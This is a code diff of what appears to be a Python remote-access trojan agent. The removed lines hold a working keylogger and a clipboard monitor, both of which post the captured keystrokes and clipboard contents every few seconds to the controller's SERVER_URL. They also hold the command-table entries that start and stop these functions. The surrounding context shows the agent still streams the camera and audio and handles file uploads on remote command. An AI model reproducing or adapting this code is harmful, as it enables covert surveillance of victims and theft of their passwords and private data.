@@ -19,7 +19,6 @@ import random
 try:
     import win32api
     import win32con
-    import win32clipboard
     import win32security
     import win32process
     import win32event
@@ -2066,129 +2065,6 @@ def stop_camera_streaming():
         CAMERA_STREAM_THREAD = None
         print("Stopped camera stream.")
 
-# --- Keylogger Functions ---
-
-def on_key_press(key):
-    """Callback for key press events."""
-    global KEYLOG_BUFFER
-    try:
-        if hasattr(key, 'char') and key.char is not None:
-            # Regular character
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
-        else:
-            # Special key
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
-    except Exception as e:
-        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")
-
-def keylogger_worker(agent_id):
-    """Keylogger worker thread that sends data periodically."""
-    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
-    url = f"{SERVER_URL}/keylog_data/{agent_id}"
-    
-    while KEYLOGGER_ENABLED:
-        try:
-            if KEYLOG_BUFFER:
-                # Send accumulated keylog data
-                data_to_send = KEYLOG_BUFFER.copy()
-                KEYLOG_BUFFER = []
-                
-                for entry in data_to_send:
-                    requests.post(url, json={"data": entry}, timeout=5)
-            
-            time.sleep(5)  # Send data every 5 seconds
-        except Exception as e:
-            print(f"Keylogger error: {e}")
-            time.sleep(5)
-
-def start_keylogger(agent_id):
-    """Start the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    if not KEYLOGGER_ENABLED:
-        KEYLOGGER_ENABLED = True
-        
-        # Start keyboard listener
-        listener = keyboard.Listener(on_press=on_key_press)
-        listener.daemon = True
-        listener.start()
-        
-        # Start worker thread
-        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
-        KEYLOGGER_THREAD.daemon = True
-        KEYLOGGER_THREAD.start()
-        
-        print("Started keylogger.")
-
-def stop_keylogger():
-    """Stop the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    if KEYLOGGER_ENABLED:
-        KEYLOGGER_ENABLED = False
-        if KEYLOGGER_THREAD:
-            KEYLOGGER_THREAD.join(timeout=2)
-        KEYLOGGER_THREAD = None
-        print("Stopped keylogger.")
-
-# --- Clipboard Monitor Functions ---
-
-def get_clipboard_content():
-    """Get current clipboard content."""
-    if WINDOWS_AVAILABLE:
-        try:
-            win32clipboard.OpenClipboard()
-            data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            return data
-        except:
-            try:
-                win32clipboard.CloseClipboard()
-            except:
-                pass
-            return None
-    else:
-        # On Linux, we'll skip clipboard monitoring for now
-        return None
-
-def clipboard_monitor_worker(agent_id):
-    """Clipboard monitor worker thread."""
-    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
-    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
-    
-    while CLIPBOARD_MONITOR_ENABLED:
-        try:
-            current_content = get_clipboard_content()
-            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
-                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
-                
-                requests.post(url, json={"data": clipboard_entry}, timeout=5)
-                LAST_CLIPBOARD_CONTENT = current_content
-            
-            time.sleep(2)  # Check clipboard every 2 seconds
-        except Exception as e:
-            print(f"Clipboard monitor error: {e}")
-            time.sleep(2)
-
-def start_clipboard_monitor(agent_id):
-    """Start clipboard monitoring."""
-    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
-    if not CLIPBOARD_MONITOR_ENABLED:
-        CLIPBOARD_MONITOR_ENABLED = True
-        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
-        CLIPBOARD_MONITOR_THREAD.daemon = True
-        CLIPBOARD_MONITOR_THREAD.start()
-        print("Started clipboard monitor.")
-
-def stop_clipboard_monitor():
-    """Stop clipboard monitoring."""
-    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
-    if CLIPBOARD_MONITOR_ENABLED:
-        CLIPBOARD_MONITOR_ENABLED = False
-        if CLIPBOARD_MONITOR_THREAD:
-            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
-        CLIPBOARD_MONITOR_THREAD = None
-        print("Stopped clipboard monitor.")
-
 # --- File Management Functions ---
 
 def handle_file_upload(command_parts):
@@ -2344,10 +2220,6 @@ def on_command(data):
         "stop-audio": stop_audio_streaming,
         "start-camera": lambda: start_camera_streaming(agent_id),
         "stop-camera": stop_camera_streaming,
-        "start-keylogger": lambda: start_keylogger(agent_id),
-        "stop-keylogger": stop_keylogger,
-        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
-        "stop-clipboard": stop_clipboard_monitor,
     }
 
     if command in internal_commands:
@@ -2442,8 +2314,6 @@ if __name__ == "__main__":
                     stop_streaming()
                     stop_audio_streaming()
                     stop_camera_streaming()
-                    stop_keylogger()
-                    stop_clipboard_monitor()
                     print("[OK] Cleaned up resources.")
                 except Exception as cleanup_error:
                     print(f"[WARN] Error during cleanup: {cleanup_error}")
